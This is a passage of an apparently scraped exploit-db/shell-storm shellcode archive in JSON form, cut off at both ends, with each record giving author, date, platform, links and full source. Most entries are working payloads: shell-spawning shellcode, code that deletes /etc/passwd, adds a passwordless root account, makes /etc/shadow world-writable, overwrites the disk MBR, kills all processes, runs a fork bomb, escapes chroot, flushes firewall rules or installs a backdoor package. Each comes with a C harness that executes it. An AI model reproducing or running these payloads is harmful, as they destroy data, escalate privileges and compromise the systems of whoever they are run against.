$0x5a", "\t\"\\x58\"\t\t\t\t\t\t// pop    %eax", "\t\"\\xcd\\x80\"\t\t\t\t\t// int    $0x80", "\t\"\\x6a\\x01\"\t\t\t\t\t// push   $0x1", "\t\"\\xff\\x74\\x24\\x18\"\t\t\t// pushl  0x18(%esp)", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x5a\"\t\t\t\t\t// push   $0x5a", "\t\"\\x58\"\t\t\t\t\t\t// pop    %eax", "\t\"\\xcd\\x80\"\t\t\t\t\t// int    $0x80", "\t\"\\x6a\\x02\"\t\t\t\t\t// push   $0x2", "\t\"\\xff\\x74\\x24\\x24\"\t\t\t// pushl  0x24(%esp)", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x5a\"\t\t\t\t\t// push   $0x5a", "\t\"\\x58\"\t\t\t\t\t\t// pop    %eax", "\t\"\\xcd\\x80\"\t\t\t\t\t// int    $0x80", "\t\"\\x68\\x73\\x68\\x00\\x00\"\t\t// push   $0x6873", "\t\"\\x89\\xe0\"\t\t\t\t\t// mov    %esp,%eax", "\t\"\\x68\\x2d\\x69\\x00\\x00\"\t\t// push   $0x692d", "\t\"\\x89\\xe1\"\t\t\t\t\t// mov    %esp,%ecx", "\t\"\\x6a\\x00\"\t\t\t\t\t// push   $0x0", "\t\"\\x51\"\t\t\t\t\t\t// push   %ecx", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\x68\\x2f\\x73\\x68\\x00\"\t\t// push   $0x68732f", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"\t\t// push   $0x6e69622f", "\t\"\\x89\\xe0\"\t\t\t\t\t// mov    %esp,%eax", "\t\"\\x8d\\x4c\\x24\\x08\"\t\t\t// lea    0x8(%esp),%ecx", "\t\"\\x6a\\x00\"\t\t\t\t\t// push   $0x0", "\t\"\\x51\"\t\t\t\t\t\t// push   %ecx", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x3b\"\t\t\t\t\t// push   $0x3b", "\t\"\\x58\"\t\t\t\t\t\t// pop    %eax", "\t\"\\xcd\\x80\";\t\t\t\t\t// int    $0x80", "", "int main(void) {", "    void (*egg)() = (void *)shellcode;", "", "    return (*(int(*)())shellcode)();", "}"]},
{"Title": "Windows/x86 (XP SP2) - calc.exe Shellcode (45 bytes)", "Author": "Stack", "Published": ": 2009-12-24", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/13571.c", "View": "https://old.exploit-db.com/raw/13571/", "code": ["/*", "win32/xp sp2 calc.exe 45 bytes", "Author : Mountassif Moad", "Big Thnx : To my brother iuoisn & His0ka & Jadi ...... Mr.Safa7", "Changed by : Stack", "First shellcode : http://www.milw0rm.com/exploits/7971", "Description : It is 45 Bytes Shellcode which Execute calc.exe Tested Under Windows Xp SP2", "for exploited a stack overflow have a small space to put our shellcode xd :d  just for fun :d", "", "*/", "#include \"stdio.h\"", "unsigned char shellcode[] =", "\"\\xB8\\xFF\\xEF\\xFF\\xFF\\xF7\\xD0\\x2B\\xE0\\x55\\x8B\\xEC\"", "\"\\x33\\xFF\\x57\\x83\\xEC\\x04\\xC6\\x45\\xF8\\x63\\xC6\\x45\"", "\"\\xF9\\x61\\xC6\\x45\\xFA\\x6C\\xC6\\x45\\xFB\\x63\\x8D\\x45\"", "\"\\xF8\\x50\\xBB\\xC7\\x93\\xBF\\x77\\xFF\\xD3\";", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "printf(\"Shellcode Length is : %d\",strlen(shellcode));", "(*ret)=(int)shellcode;", "return 0;", "}"]},
{"Title": "Linux/x86 - unlink(/etc/passwd) + exit() Shellcode (35 bytes)", "Author": "$andman", "Published": ": 2009-12-24", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-560.php", "View": null, "code": ["# Title: linux/x86 unlink(/etc/passwd) & exit() 35 bytes", "# Date: 2009-12-24", "# Author: sandman, n4mdn4s [4T] gmail [D0T] com", "# Tested on: linux/Fedora 12", "# Code :", "", "/*", "    unlink_passwd.c", "    Platform: linux/x86", "    Size: 35 bytes", "    Author: $andman", "*/", "", "#include <string.h>", "#include <stdio.h>", "char shell[] =  \"\\xeb\\x11\"                     //jmp    8048073", "                     \"\\x5e\"                           //pop    %esi", "                     \"\\x31\\xc0\"                     //xor    %eax,%eax", "                     \"\\x31\\xc9\"                     //xor    %ecx,%ecx", "                     \"\\x31\\xd2\"                     //xor    %edx,%edx", "                     \"\\xb0\\x0a\"                    //mov    $0xa,%al", "                     \"\\x89\\xf3\"                     //mov    %esi,%ebx", "                     \"\\xcd\\x80\"                    //int    $0x80", "                     \"\\xb0\\x01\"                    //mov    $0x1,%al", "                     \"\\xcd\\x80\"                    //int    $0x80", "                     \"\\xe8\\xea\\xff\\xff\\xff\"      //call    8048062", "                     \"\\x2f\"                           //das", "                     \"\\x65\"                          //gs", "                     \"\\x74\\x63\"                    //je    80480df", "                     \"\\x2f\"                           //das", "                     \"\\x70\\x61\"                    //jo    80480e0", "                     \"\\x73\\x73\"                    //jae    80480f4", "                     \"\\x77\\x64\";                   //ja    80480e7", "int main()", "{", "  printf(\"Shellcode Length: %d\\n\",strlen(shell));", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shell;", "}", "", "//#$"]},
{"Title": "Windows/x86 (XP SP2) (English / Arabic) - cmd.exe Shellcode (23 bytes)", "Author": "AnTi SeCuRe", "Published": ": 2009-12-28", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-568.php", "View": null, "code": ["/*", "win32/xp sp2 (En + Ar) cmd.exe 23 bytes", "Author : AnTi SeCuRe", "TeaM : SauDi ViRuS TeaM", "Email : AnTi-SeCuRe@HoTMaiL.CoM", "Site : WwW.VxX9.Cc", "Thx To : Stack , SauDi ViRuS TeaM ( RENO - Dr.php - ! BaD BoY ! - Jetli007 - Gov.hacker )", "Description : It's a 23 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2 English and arabic .", "get the following if we disassemle this code compiled with olly debugger", "", "00402000  > 8BEC             MOV EBP,ESP", "00402002  . 68 65786520      PUSH 20657865", "00402007  . 68 636D642E      PUSH 2E646D63", "0040200C  . 8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]", "0040200F  . 50               PUSH EAX", "00402010  . B8 8D15867C      MOV EAX,kernel32.WinExec", "00402015  . FFD0             CALL EAX", "*/", "#include <stdio.h>", "unsigned char shellcode[] =", "                        \"\\x8b\\xec\\x68\\x65\\x78\\x65\"", "                        \"\\x20\\x68\\x63\\x6d\\x64\\x2e\"", "                        \"\\x8d\\x45\\xf8\\x50\\xb8\\x8D\"", "                        \"\\x15\\x86\\x7C\\xff\\xd0\";", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "printf(\"Shellcode Length is : %d\\n\",strlen(shellcode));", "(*ret)=(int)shellcode;", "return 0;", "}"]},
{"Title": "Linux/x86 - setuid() + Break chroot (mkdir/chdir/chroot '...') + execve(/bin/sh) Shellcode (79 bytes)", "Author": "root@thegibson", "Published": ": 2009-12-30", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13577.txt", "View": "https://old.exploit-db.com/raw/13577/", "code": ["bt:/# ./pwn `perl -e 'print \"\\x90\"x189 . \"\\xb0\\x17\\x31\\xdb\\xcd\\x80\\xb0\\x27\\x99\\x52\\x6a\\x2e\\x66\\x68\\x2e\\x2e\\x89\\xe3\\x66\\xb9\\xc0\\x01\\xcd\\x80\\xb0\\x3d\\x89\\xe3\\xcd\\x80\\x66\\x5a\\x31\\xc9\\x51\\x66\\x52\\xb1\\x64\\xb0\\x0c\\x89\\xe3\\xcd\\x80\\xe2\\xf8\\xb0\\x3d\\x31\\xc9\\x88\\x4c\\x24\\x01\\x89\\xe3\\xcd\\x80\\xb0\\x0b\\x31\\xc9\\x51\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x99\\xcd\\x80\" . \"\\xa9\\xf6\\xff\\xbf\"'`", "perl: warning: Setting locale failed.", "perl: warning: Please check that your locale settings:", "LANGUAGE = (unset),", "LC_ALL = (unset),", "LANG = \"en_US.UTF-8\"", "are supported and installed on your system.", "perl: warning: Falling back to the standard locale (\"C\").", "root@bt:/#", "", "", "; linux/x86 break chroot 79 bytes", "; root@thegibson", "; 2009-12-30", "", "section .text", "\tglobal _start", "", "_start:", "\t; setuid(0);", "\tmov al, 23", "\txor ebx, ebx", "\tint 0x80", "", "\t; mkdir(\"...\", 0700);", "\tmov al, 39", "\tcdq", "\tpush edx", "\tpush byte 0x2e", "\tpush word 0x2e2e", "\tmov ebx, esp", "\tmov cx, 0700o", "\tint 0x80", "", "\t; chroot(\"...\");", "\tmov al, 61", "\tmov ebx, esp", "\tint 0x80", "", "\t; for (i = 100; i > 0; i--)", "\t; {", "\t; \tchdir(\"..\");", "\t; }", "\tpop dx", "\txor ecx, ecx", "\tpush ecx", "\tpush dx", "\tmov cl, 100", "\tup:", "\t\tmov al, 12", "\t\tmov ebx, esp", "\t\tint 0x80", "\tloop up", "", "\t; chroot(\".\");", "\tmov al, 61", "\txor ecx, ecx", "\tmov [esp + 1], cl", "\tmov ebx, esp", "\tint 0x80", "", "\t; execve(\"//bin/sh\", 0, 0);", "\tmov al, 11", "\txor ecx, ecx", "\tpush ecx", "\tpush dword 0x68732f6e", "\tpush dword 0x69622f2f", "\tmov ebx, esp", "\tcdq", "\tint 0x80"]},
{"Title": "Linux/x86 - Fork Bomb Shellcode (6 bytes) (1)", "Author": "root@thegibson", "Published": ": 2009-12-30", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13578.asm", "View": "https://old.exploit-db.com/raw/13578/", "code": ["Smallest fork bomb shellcode I could make.", "", "", "; linux/x86 fork bomb 6 bytes", "; root@thegibson", "; 2009-12-30", "", "section .text", "\tglobal _start", "", "_start:", "\t; fork()", "\tmov al, 2", "\tint 0x80", "\tjmp short _start"]},
{"Title": "Linux/x86 - Add Root User (toor) To /etc/passwd + No password + exit() Shellcode (107 bytes)", "Author": "$andman", "Published": ": 2009-12-31", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-561.php", "View": null, "code": ["/*", "    append_passwd.c", "    Payload: Adds the string: [toor::0:0:t00r:/root:/bin/bash] to /etc/passwd thereby adding a password-less root account with login name \"toor\"", "    Platform: linux/x86", "    Size: 107 bytes", "    Author: $andman", "*/", "", "/*", "08049054 <_start>:", " 8049054:    eb 38                    jmp    804908e <callfunc>", "", "08049056 <func>:", " 8049056:    5e                       pop    %esi", " 8049057:    31 c0                    xor    %eax,%eax", " 8049059:    88 46 0b                 mov    %al,0xb(%esi)", " 804905c:    88 46 2b                 mov    %al,0x2b(%esi)", " 804905f:    c6 46 2a 0a              movb   $0xa,0x2a(%esi)", " 8049063:    8d 5e 0c                 lea    0xc(%esi),%ebx", " 8049066:    89 5e 2c                 mov    %ebx,0x2c(%esi)", " 8049069:    8d 1e                    lea    (%esi),%ebx", " 804906b:    66 b9 42 04              mov    $0x442,%cx", " 804906f:    66 ba a4 01              mov    $0x1a4,%dx", " 8049073:    b0 05                    mov    $0x5,%al", " 8049075:    cd 80                    int    $0x80", " 8049077:    89 c3                    mov    %eax,%ebx", " 8049079:    31 d2                    xor    %edx,%edx", " 804907b:    8b 4e 2c                 mov    0x2c(%esi),%ecx", " 804907e:    b2 1f                    mov    $0x1f,%dl", " 8049080:    b0 04                    mov    $0x4,%al", " 8049082:    cd 80                    int    $0x80", " 8049084:    b0 06                    mov    $0x6,%al", " 8049086:    cd 80                    int    $0x80", " 8049088:    b0 01                    mov    $0x1,%al", " 804908a:    31 db                    xor    %ebx,%ebx", " 804908c:    cd 80                    int    $0x80", "", "0804908e <callfunc>:", " 804908e:    e8 c3 ff ff ff           call   8049056 <func>", " 8049093:    ......string.......", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char shell[]=   \"\\xeb\\x38\\x5e\\x31\\xc0\\x88\\x46\\x0b\\x88\\x46\\x2b\\xc6\\x46\\x2a\\x0a\\x8d\\x5e\\x0c\\x89\\x5e\\x2c\\x8d\\x1e\"", "        \"\\x66\\xb9\\x42\\x04\\x66\\xba\\xa4\\x01\\xb0\\x05\\xcd\\x80\\x89\\xc3\\x31\\xd2\\x8b\\x4e\\x2c\\xb2\\x1f\\xb0\\x04\"", "        \"\\xcd\\x80\\xb0\\x06\\xcd\\x80\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xc3\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x70\"", "        \"\\x61\\x73\\x73\\x77\\x64\\x23\\x74\\x6f\\x6f\\x72\\x3a\\x3a\\x30\\x3a\\x30\\x3a\\x74\\x30\\x30\\x72\\x3a\\x2f\\x72\"", "        \"\\x6f\\x6f\\x74\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\\x20\\x23\";", "main(){", "    printf(\"[+]shellcode length %d\\n\", strlen(shell));", "    int *ret;", "      ret = (int *)&ret + 2;", "      (*ret) = (int)shell;", "}", "//HAPPY NEW YEAR!", "//#$"]},
{"Title": "Windows (XP Professional SP2) (English) - MessageBox + Null-Free Shellcode (16 bytes)", "Author": "Aodrulez", "Published": ": 2010-01-03", "Platform": "Windows", "Download": "http://shell-storm.org/shellcode/files/shellcode-526.php", "View": null, "code": ["+-----------------------------------------------------+", "| Windows XP Pro Sp2 English \"Message-Box\" Shellcode. |", "+-----------------------------------------------------+", "", "Size         : 16 Bytes, Null-Free.", "Author       : Aodrulez. ", "Email        : f3arm3d3ar@gmail.com", "", "", "", "Shellcode = \"\\xB9\\x78\\x68\\x82\\x7C\\x33\\xC0\\xBB\"", "            \"\\xF8\\x0C\\x86\\x7C\\x51\\x50\\xFF\\xD3\"", "", "", "", "", "+--------------+", "| Description: |", "+--------------+", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "I've used a Function called \"FatalAppExit\".", "The Benefits are Three-Fold!", "", "1] Displays a MessageBox.", "2] Terminates the Process. ", "3] Its there in Kernel32.dll itself.", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "", "", "", "", "+-----------+", "| Asm Code: |", "+-----------+", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "shellcode:", " \t      mov ecx,7c826878h ;\"Admin\" string in mem", " \t      xor eax,eax", " \t      mov ebx,7c860cf8h ;Addr of \"FatalAppExit()\" ", " \t\tpush ecx          ;function from Kernel32", " \t\tpush eax          ", " \t\tcall ebx          ;App does a Clean Exit.", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "", "", "", "", "", "+-----------------+", "| Shellcodetest.c |", "+-----------------+", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "char code[] = \"\\xB9\\x78\\x68\\x82\\x7C\\x33\\xC0\\xBB\"", "              \"\\xF8\\x0C\\x86\\x7C\\x51\\x50\\xFF\\xD3\";", " ", "", "", "", "int main(int argc, char **argv)", "{", "  ", "  int (*func)();", "  func = (int (*)()) code;", "  (int)(*func)();", "}", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "", "", "+-------------------+", "| Greetz Fly Out To |", "+-------------------+", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "1] Amforked()\t : My Mentor.", "2] The Blue Genius : My Boss.", "3] www.orchidseven.com", "4] str0ke", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "+---------------------------------------------+", "| Forgive, O Lord, My Little Jokes on Thee,   |", "| and I'll Forgive Thy Great Big Joke on Me.  |", "+---------------------------------------------+"]},
{"Title": "Windows (XP Professional SP2) (English) - Wordpad.exe + Null-Free Shellcode (12 bytes)", "Author": "Aodrulez", "Published": ": 2010-01-03", "Platform": "Windows", "Download": "https://old.exploit-db.com/download/13582.txt", "View": "https://old.exploit-db.com/raw/13582/", "code": ["+-------------------------------------------------+", "| Windows XP Pro Sp2 English \"Wordpad\" Shellcode. |", "+-------------------------------------------------+", "", "Size         : 12 Bytes,Null Free.", "Author       : Aodrulez. ", "Email        : f3arm3d3ar@gmail.com", "Milw0rm      : www.milw0rm.com/author/1620", "", "Shellcode =   \"\\x68\\x87\\x4c\\x80\\x7c\\xb8\"", "              \"\\x6d\\x13\\x86\\x7c\\xff\\xd0\"", "", "+-----------------+", "| Shellcodetest.c |", "+-----------------+", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "char code[] = \"\\x68\\x87\\x4c\\x80\\x7c\\xb8\"", "              \"\\x6d\\x13\\x86\\x7c\\xff\\xd0\";", "", "", "int main(int argc, char **argv)", "{", "  ", "  int (*func)();", "  func = (int (*)()) code;", "  (int)(*func)();", "}", "", "", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "+-------------------+", "| Greetz Fly Out To |", "+-------------------+", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "1] Amforked()\t : My Mentor.", "2] The Blue Genius : My Boss.", "3] www.orchidseven.com", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"]},
{"Title": "Linux/x86 - Eject /dev/cdrom Shellcode (42 bytes)", "Author": "root@thegibson", "Published": ": 2010-01-08", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-563.php", "View": null, "code": ["; linux/x86 eject /dev/cdrom 42 bytes", "; root@thegibson", "; 2010-01-08", "", "section .text", "\tglobal _start", "", "_start:", "\t; open(\"/dev/cdrom\", O_RDONLY | O_NONBLOCK);", "\tmov al, 5", "\tcdq", "\tpush edx", "\tpush word 0x6d6f", "\tpush dword 0x7264632f", "\tpush dword 0x7665642f", "\tmov ebx, esp", "\tmov cx, 0xfff", "\tsub cx, 0x7ff", "\tint 0x80", "", "\t; ioctl(fd, CDROMEJECT, 0);", "\tmov ebx, eax", "\tmov al, 54", "\tmov cx, 0x5309", "\tcdq", "\tint 0x80"]},
{"Title": "Linux/x86 - Kill All Processes Shellcode (9 bytes)", "Author": "root@thegibson", "Published": ": 2010-01-14", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-564.php", "View": null, "code": ["; linux/x86 kill all processes 9 bytes", "; root@thegibson", "; 2010-01-14", "", "section .text", "        global _start", "", "_start:", "        ; kill(-1, SIGKILL);", "        mov al, 37", "        push byte -1", "        pop ebx", "        mov cl, 9", "        int 0x80"]},
{"Title": "Linux/x86 - Overwrite MBR on /dev/sda with `LOL!' Shellcode (43 bytes)", "Author": "root@thegibson", "Published": ": 2010-01-15", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-565.php", "View": null, "code": ["; linux/x86 overwrite MBR on /dev/sda with `LOL!' 43 bytes", "; root@thegibson", "; 2010-01-15", "", "section .text", "        global _start", "", "_start:", "        ; open(\"/dev/sda\", O_WRONLY);", "        mov al, 5", "        xor ecx, ecx", "        push ecx", "        push dword 0x6164732f", "        push dword 0x7665642f", "        mov ebx, esp", "        inc ecx", "        int 0x80", "", "        ; write(fd, \"LOL!\"x128, 512);", "        mov ebx, eax", "        mov al, 4", "        cdq", "        push edx", "        mov cl, 128", "        fill:", "                push dword 0x214c4f4c", "        loop fill", "        mov ecx, esp", "        inc edx", "        shl edx, 9", "        int 0x80"]},
{"Title": "Linux/x86 - chmod 666 /etc/shadow Shellcode (27 bytes)", "Author": "root@thegibson", "Published": ": 2010-01-16", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-566.php", "View": null, "code": ["; linux/x86 chmod 666 /etc/shadow 27 bytes", "; root@thegibson", "; 2010-01-15", "", "section .text", "        global _start", "", "_start:", "        ; chmod(\"//etc/shadow\", 0666);", "        mov al, 15", "        cdq", "        push edx", "        push dword 0x776f6461", "        push dword 0x68732f63", "        push dword 0x74652f2f", "        mov ebx, esp", "        mov cx, 0666o", "        int 0x80"]},
{"Title": "Windows/x86 (XP SP2) (French) - calc.exe Shellcode (19 bytes)", "Author": "SkuLL-HackeR", "Published": ": 2010-01-20", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-567.php", "View": null, "code": ["/*", "Author: SkuLL-HacKeR", "Big Thx To :  my brothers : Pr0F.SELLiM - ThE X-HaCkEr -  Jiko  - My friends in Morocco", "H0ME  : Geeksec.com  & No-exploiT", "Email : My@Hotmail.iT & Wizard-skh@hotmail.com", "", "", "// Win32 Shellcode Collection (calc) 19 bytes", "// Shellcode Exec Calc.exe", "// Tested on XP SP2 FR", "#include \"stdio.h\"", "unsigned char shellcode[] = \"\\xeB\\x02\\xBA\\xC7\\x93\"", "                            \"\\xBF\\x77\\xFF\\xD2\\xCC\"", "                            \"\\xE8\\xF3\\xFF\\xFF\\xFF\"", "                            \"\\x63\\x61\\x6C\\x63\";", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "printf(\"Shellcode Length is : %d\\n\",strlen(shellcode));", "(*ret)=(int)shellcode;", "return 0;", "}"]},
{"Title": "Linux/x86 - ip6tables -F + Polymorphic Shellcode (71 bytes)", "Author": "Jonathan Salwan", "Published": ": 2010-01-24", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13599.c", "View": "https://old.exploit-db.com/raw/13599/", "code": ["/*  Linux x86 - polymorphic shellcode ip6tables -F - 71 bytes", " *  Jonathan Salwan < submit [!] shell-storm.org >", " *  ", " *\t! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ ! ", " *", " *", " *  The Gnuser Project (Gnu Users Manager) => http://www.gnuser.org", " *", " * Disassembly of section .text:", " *", " * 08048054 <.text>:", " * 8048054:\t6a 0b                \tpush   $0xb", " * 8048056:\t58                   \tpop    %eax", " * 8048057:\t99                   \tcltd   ", " * 8048058:\t52                   \tpush   %edx", " * 8048059:\t66 68 2d 46          \tpushw  $0x462d", " * 804805d:\t89 e1                \tmov    %esp,%ecx", " * 804805f:\t52                   \tpush   %edx", " * 8048060:\t6a 73                \tpush   $0x73", " * 8048062:\t66 68 6c 65          \tpushw  $0x656c", " * 8048066:\t68 36 74 61 62       \tpush   $0x62617436", " * 804806b:\t68 6e 2f 69 70       \tpush   $0x70692f6e", " * 8048070:\t68 2f 73 62 69       \tpush   $0x6962732f", " * 8048075:\t68 2f 75 73 72       \tpush   $0x7273752f", " * 804807a:\t89 e3                \tmov    %esp,%ebx", " * 804807c:\t52                   \tpush   %edx", " * 804807d:\t51                   \tpush   %ecx", " * 804807e:\t53                   \tpush   %ebx", " * 804807f:\t89 e1                \tmov    %esp,%ecx", " * 8048081:\tcd 80                \tint    $0x80", "*/", "", "#include <stdio.h>", "", "int main(int argc, char *argv[])", "{", "char shellcode[] = \t\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x47\\x80\"", "\t\t\t\"\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\"", "  \t\t\t\"\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\"", "\t\t\t\"\\x6b\\x0c\\x59\\x9a\\x53\\x67\\x69\\x2e\"", "\t\t\t\"\\x47\\x8a\\xe2\\x53\\x6b\\x74\\x67\\x69\"", "\t\t\t\"\\x6d\\x66\\x69\\x37\\x75\\x62\\x63\\x69\"", "\t\t\t\"\\x6f\\x30\\x6a\\x71\\x69\\x30\\x74\\x63\"", "\t\t\t\"\\x6a\\x69\\x30\\x76\\x74\\x73\\x8a\\xe4\"", "\t\t\t\"\\x53\\x52\\x54\\x8a\\xe2\\xce\\x81\";", "", "       \tfprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();       ", "}"]},
{"Title": "Linux/x86 - ip6tables -F Shellcode (47 bytes)", "Author": "Jonathan Salwan", "Published": ": 2010-01-24", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13600.c", "View": "https://old.exploit-db.com/raw/13600/", "code": ["/*  Linux x86 - ip6tables -F - 47 bytes", " *  Jonathan Salwan < submit [!] shell-storm.org >", " *  ", " *\t! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ ! ", " *", " *", " *  The Gnuser Project (Gnu Users Manager) => http://www.gnuser.org", " *", " * Disassembly of section .text:", " *", " * 08048054 <.text>:", " * 8048054:\t6a 0b                \tpush   $0xb", " * 8048056:\t58                   \tpop    %eax", " * 8048057:\t99                   \tcltd   ", " * 8048058:\t52                   \tpush   %edx", " * 8048059:\t66 68 2d 46          \tpushw  $0x462d", " * 804805d:\t89 e1                \tmov    %esp,%ecx", " * 804805f:\t52                   \tpush   %edx", " * 8048060:\t6a 73                \tpush   $0x73", " * 8048062:\t66 68 6c 65          \tpushw  $0x656c", " * 8048066:\t68 36 74 61 62       \tpush   $0x62617436", " * 804806b:\t68 6e 2f 69 70       \tpush   $0x70692f6e", " * 8048070:\t68 2f 73 62 69       \tpush   $0x6962732f", " * 8048075:\t68 2f 75 73 72       \tpush   $0x7273752f", " * 804807a:\t89 e3                \tmov    %esp,%ebx", " * 804807c:\t52                   \tpush   %edx", " * 804807d:\t51                   \tpush   %ecx", " * 804807e:\t53                   \tpush   %ebx", " * 804807f:\t89 e1                \tmov    %esp,%ecx", " * 8048081:\tcd 80                \tint    $0x80", "*/", "", "#include <stdio.h>", "", "int main(int argc, char *argv[])", "{", "char shellcode[] = \t\"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\"", "\t\t\t\"\\x46\\x89\\xe1\\x52\\x6a\\x73\\x66\\x68\"", "\t\t\t\"\\x6c\\x65\\x68\\x36\\x74\\x61\\x62\\x68\"", "\t\t\t\"\\x6e\\x2f\\x69\\x70\\x68\\x2f\\x73\\x62\"", "\t\t\t\"\\x69\\x68\\x2f\\x75\\x73\\x72\\x89\\xe3\"", "\t\t\t\"\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\";", "", "       \tfprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();       ", "}"]},
{"Title": "Linux/i686 - pacman -S <package> (default package: backdoor) Shellcode (64 bytes)", "Author": "Jonathan Salwan", "Published": ": 2010-01-24", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13601.c", "View": "https://old.exploit-db.com/raw/13601/", "code": ["/*", " Title\t: Linux i686 - pacman -S <package> (default package: backdoor) - 64 bytes", " Author\t: Jonathan Salwan", " Mail\t: submit [!] shell-storm.org", " Web\t: http://www.shell-storm.org", "", " Pacman is a software package manager, developed as part of the Arch Linux distribution.", " With this shellcode you can install the backdoor packages.", "", "\t! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ ! ", "", "", " Disassembly of section .text:", "", " 08048054 <.text>:", " 8048054:\t31 c0                \txor    %eax,%eax", " 8048056:\t31 db                \txor    %ebx,%ebx", " 8048058:\t31 c9                \txor    %ecx,%ecx", " 804805a:\t31 d2                \txor    %edx,%edx", " 804805c:\t31 f6                \txor    %esi,%esi", " 804805e:\t52                   \tpush   %edx", " 804805f:\t68 64 6f 6f 72       \tpush   $0x726f6f64\t<< This is a package ", " 8048064:\t68 62 61 63 6b       \tpush   $0x6b636162\t<< (backdoor). You can change it.", " 8048069:\t89 e6                \tmov    %esp,%esi", " 804806b:\t52                   \tpush   %edx", " 804806c:\t66 68 2d 53          \tpushw  $0x532d", " 8048070:\t89 e1                \tmov    %esp,%ecx", " 8048072:\t52                   \tpush   %edx", " 8048073:\t68 63 6d 61 6e       \tpush   $0x6e616d63", " 8048078:\t68 6e 2f 70 61       \tpush   $0x61702f6e", " 804807d:\t68 72 2f 62 69       \tpush   $0x69622f72", " 8048082:\t68 2f 2f 75 73       \tpush   $0x73752f2f", " 8048087:\t89 e3                \tmov    %esp,%ebx", " 8048089:\t52                   \tpush   %edx", " 804808a:\t56                   \tpush   %esi", " 804808b:\t51                   \tpush   %ecx", " 804808c:\t53                   \tpush   %ebx", " 804808d:\t89 e1                \tmov    %esp,%ecx", " 804808f:\tb0 0b                \tmov    $0xb,%al", " 8048091:\t99                   \tcltd   ", " 8048092:\tcd 80                \tint    $0x80", "", "", "*/", "", "", "#include <stdio.h>", "", "int main(void)", "{", "char shellcode[] = \t", "", "\t\t\t\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\"", "\t\t\t\"\\xd2\\x31\\xf6\\x52\\x68\\x64\\x6f\"", "\t\t\t\"\\x6f\\x72\\x68\\x62\\x61\\x63\\x6b\"\t\t", "\t\t\t\"\\x89\\xe6\\x52\\x66\\x68\\x2d\\x52\"", "\t\t\t\"\\x89\\xe1\\x52\\x68\\x63\\x6d\\x61\"", "\t\t\t\"\\x6e\\x68\\x6e\\x2f\\x70\\x61\\x68\"", "\t\t\t\"\\x72\\x2f\\x62\\x69\\x68\\x2f\\x2f\"", "\t\t\t\"\\x75\\x73\\x89\\xe3\\x52\\x56\\x51\"", "\t\t\t\"\\x53\\x89\\xe1\\xb0\\x0b\\x99\\xcd\"", "\t\t\t\"\\x80\";", "", "       \tprintf(\"Length: 